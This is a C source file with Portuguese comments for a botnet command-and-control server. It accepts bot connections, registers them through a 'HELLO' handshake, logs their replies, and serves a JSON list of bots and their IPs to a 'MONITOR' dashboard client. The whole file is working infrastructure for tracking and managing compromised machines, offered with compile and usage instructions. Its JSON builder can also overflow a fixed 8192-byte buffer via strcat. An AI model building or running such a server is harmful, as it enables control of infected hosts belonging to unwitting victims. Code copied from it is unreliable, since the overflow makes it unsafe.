// c2_server_v2.c - Servidor C2 com suporte a API de Monitoramento
// Compilar: gcc c2_server_v2.c -o c2_server
// Uso: ./c2_server 5555

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <time.h>

#define MAX_BOTS 100
#define BUF_SIZE 2048

typedef struct {
    int fd;
    char id[64];
    char ip[INET_ADDRSTRLEN];
    time_t last_seen;
    char status[10]; // "online", "idle"
} bot_t;

// Função auxiliar para construir JSON manual (sem bibliotecas externas)
void send_bot_list_json(int fd, bot_t *bots, int count) {
    char json_buf[8192];
    strcpy(json_buf, "[");
    
    int first = 1;
    for (int i = 0; i < count; i++) {
        if (bots[i].fd > 0 && strcmp(bots[i].id, "MONITOR") != 0) {
            if (!first) strcat(json_buf, ",");
            
            char entry[256];
            // Calcula latência fake ou tempo desde ultimo contato
            int latency = (int)(time(NULL) - bots[i].last_seen); 
            
            snprintf(entry, sizeof(entry), 
                "{\"id\": \"%s\", \"ip\": \"%s\", \"status\": \"online\", \"last_seen\": \"%ld\", \"latency\": %d}",
                bots[i].id, bots[i].ip, bots[i].last_seen, latency);
            
            strcat(json_buf, entry);
            first = 0;
        }
    }
    strcat(json_buf, "]\n");
    send(fd, json_buf, strlen(json_buf), 0);
}

int main(int argc, char *argv[]) {
    int server_fd, port, max_fd;
    struct sockaddr_in addr;
    fd_set read_fds;
    bot_t bots[MAX_BOTS];
    int bot_count = 0;
    char buffer[BUF_SIZE];

    if (argc != 2) {
        fprintf(stderr, "Uso: %s <porta>\n", argv[0]);
        return 1;
    }

    port = atoi(argv[1]);
    memset(bots, 0, sizeof(bots));

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket"); return 1;
    }
    
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }

    if (listen(server_fd, 10) < 0) {
        perror("listen"); return 1;
    }

    printf("[C2] Servidor v2 (API Ready) na porta %d\n", port);

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(server_fd, &read_fds);
        max_fd = server_fd;

        for (int i = 0; i < bot_count; i++) {
            if (bots[i].fd > 0) {
                FD_SET(bots[i].fd, &read_fds);
                if (bots[i].fd > max_fd) max_fd = bots[i].fd;
            }
        }

        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) break;

        // Nova conexão
        if (FD_ISSET(server_fd, &read_fds)) {
            struct sockaddr_in cli_addr;
            socklen_t cli_len = sizeof(cli_addr);
            int new_fd = accept(server_fd, (struct sockaddr *)&cli_addr, &cli_len);
            
            if (new_fd >= 0) {
                if (bot_count < MAX_BOTS) {
                    bots[bot_count].fd = new_fd;
                    strcpy(bots[bot_count].id, "UNKNOWN");
                    // Salva o IP
                    inet_ntop(AF_INET, &(cli_addr.sin_addr), bots[bot_count].ip, INET_ADDRSTRLEN);
                    bots[bot_count].last_seen = time(NULL);
                    bot_count++;
                    printf("[C2] Conexão de %s (fd=%d)\n", bots[bot_count-1].ip, new_fd);
                } else {
                    close(new_fd);
                }
            }
        }

        // Mensagens dos Clientes
        for (int i = 0; i < bot_count; i++) {
            int fd = bots[i].fd;
            if (fd > 0 && FD_ISSET(fd, &read_fds)) {
                int n = recv(fd, buffer, sizeof(buffer)-1, 0);
                if (n <= 0) {
                    printf("[C2] Desconectado: %s\n", bots[i].id);
                    close(fd);
                    bots[i].fd = -1;
                } else {
                    buffer[n] = '\0';
                    bots[i].last_seen = time(NULL);

                    // Handshake
                    if (strncmp(bots[i].id, "UNKNOWN", 7) == 0) {
                        if (strncmp(buffer, "HELLO ", 6) == 0) {
                            char *id_ptr = buffer + 6;
                            id_ptr[strcspn(id_ptr, "\r\n")] = 0;
                            
                            // Se for o MONITOR (Dashboard), enviamos a lista JSON e não registramos como bot normal
                            if (strcmp(id_ptr, "MONITOR") == 0) {
                                printf("[C2] API Dashboard solicitou dados.\n");
                                send_bot_list_json(fd, bots, bot_count);
                                // O monitor não fica persistente na lista de "ataque", mas mantemos a conexão aberta ou fechamos?
                                // Vamos fechar após enviar para simplificar
                                close(fd);
                                bots[i].fd = -1; 
                            } else {
                                strncpy(bots[i].id, id_ptr, sizeof(bots[i].id)-1);
                                send(fd, "OK\n", 3, 0);
                                printf("[C2] Bot registrado: %s\n", bots[i].id);
                            }
                        }
                    } else {
                        // Log de resposta de bot
                        printf("[%s] %s\n", bots[i].id, buffer);
                    }
                }
            }
        }
    }
    return 0;
}